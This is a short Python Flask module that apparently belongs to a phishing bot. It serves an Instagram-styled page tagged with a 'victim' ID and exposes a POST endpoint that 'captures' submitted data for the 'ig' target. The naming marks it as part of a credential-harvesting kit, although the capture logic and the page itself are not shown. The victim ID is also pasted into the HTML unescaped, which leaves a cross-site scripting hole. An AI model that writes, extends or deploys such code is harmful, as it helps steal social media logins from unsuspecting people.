from flask import request
from bot.servers.base import create_capture_route

def register_insta_routes(app):
    @app.route('/p/ig/<uid>')
    def insta_page(uid):
        victim_id = request.args.get('v', 'unknown')
        with open('web/pages/insta.html', 'r') as f:
            html = f.read()
        html = html.replace('{{VICTIM_ID}}', victim_id)
        return html
    
    @app.route('/api/capture/ig', methods=['POST'])
    def capture_ig():
        return create_capture_route('ig')()
